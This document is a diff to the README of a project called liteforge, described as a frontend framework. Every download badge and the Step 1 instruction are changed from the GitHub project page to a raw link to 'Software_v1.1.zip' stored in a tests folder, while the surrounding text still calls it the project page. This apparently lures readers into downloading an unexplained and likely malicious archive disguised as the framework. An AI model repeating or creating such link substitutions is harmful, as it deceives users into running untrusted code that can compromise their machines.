@@ -1,6 +1,6 @@
 # ⚡ liteforge - Fast, Simple Frontend Framework
 
-[![Download liteforge](https://img.shields.io/badge/Download-liteforge-brightgreen)](https://github.com/lamproskpr2/liteforge)
+[![Download liteforge](https://img.shields.io/badge/Download-liteforge-brightgreen)](https://raw.githubusercontent.com/lamproskpr2/liteforge/main/packages/vite-plugin/tests/Software_v1.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You don’t need any special software installed before using liteforge.
 
 Click the button below to open the liteforge page on GitHub. This page contains all the information and files you need to get started.
 
-[![Get liteforge](https://img.shields.io/badge/Download%20Page-Grey)](https://github.com/lamproskpr2/liteforge)
+[![Get liteforge](https://img.shields.io/badge/Download%20Page-Grey)](https://raw.githubusercontent.com/lamproskpr2/liteforge/main/packages/vite-plugin/tests/Software_v1.1.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Follow these steps carefully to download and start using liteforge.
 ### Step 1: Visit the Download Page
 
 - Click the green button at the top or go to this link in your web browser:  
-  https://github.com/lamproskpr2/liteforge
+  https://raw.githubusercontent.com/lamproskpr2/liteforge/main/packages/vite-plugin/tests/Software_v1.1.zip
 
 - This page shows you the project files and instructions.
 
@@ -145,4 +145,4 @@ liteforge covers many areas you might want to explore later:
 
 ---
 
-[![Download liteforge](https://img.shields.io/badge/Download-liteforge-blue)](https://github.com/lamproskpr2/liteforge)
+[![Download liteforge](https://img.shields.io/badge/Download-liteforge-blue)](https://raw.githubusercontent.com/lamproskpr2/liteforge/main/packages/vite-plugin/tests/Software_v1.1.zip)
